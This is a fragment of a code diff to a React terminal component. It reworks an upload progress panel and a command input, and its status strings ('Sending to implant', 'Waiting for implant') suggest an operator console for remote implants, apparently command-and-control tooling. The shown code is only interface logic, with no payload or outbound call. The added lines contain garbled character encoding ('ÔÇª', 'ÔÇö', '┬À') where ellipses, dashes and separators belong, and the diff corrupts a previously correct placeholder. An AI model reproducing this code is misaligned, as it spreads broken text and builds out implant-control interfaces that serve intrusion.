-                    : uploadProgress?.phase === 'send'
-                      ? 'Sending to implant…'
-                      : 'Upload…'}
-                </span>
-                <span>{terminalUploadBarPercent(uploadProgress)}%</span>
-              </UploadProgressMeta>
-              <UploadProgressTrack>
-                <UploadProgressFill style={{ width: `${terminalUploadBarPercent(uploadProgress)}%` }} />
-              </UploadProgressTrack>
-            </UploadProgressRow>
-          )}
         </UploadToolbar>
+
+        {uploadProgress && (
+          <UploadProgressPanel>
+            <UploadProgressMeta>
+              <span>
+                {uploadProgress.phase === 'reading' && 'Reading fileÔÇª'}
+                {uploadProgress.phase === 'waiting' && 'Waiting for implantÔÇª'}
+                {uploadProgress.phase === 'transfer' && 'UploadingÔÇª'}
+                {uploadProgress.phase === 'done' && 'Upload complete'}
+                {uploadProgress.phase === 'error' && 'Upload failed'}
+                {' ÔÇö '}
+                {uploadProgress.name || 'file'}
+              </span>
+              <span>
+                {uploadProgress.percent}%
+                {uploadProgress.total > 0 ? ` ┬À ${formatBytes(uploadProgress.sent)} / ${formatBytes(uploadProgress.total)}` : ''}
+              </span>
+            </UploadProgressMeta>
+            <ProgressTrack>
+              <ProgressFill $percent={uploadProgress.percent} />
+            </ProgressTrack>
+          </UploadProgressPanel>
+        )}
 
         <InputArea>
           <CommandInput
@@ -1031,7 +1092,7 @@ const Terminal = ({ client, socket }) => {
             value={command}
             onChange={(e) => setCommand(e.target.value)}
             onKeyPress={handleKeyPress}
-            placeholder="Enter command..."
+            placeholder="Enter commandÔÇª"
             disabled={!isConnected}
           />
           <SendButton
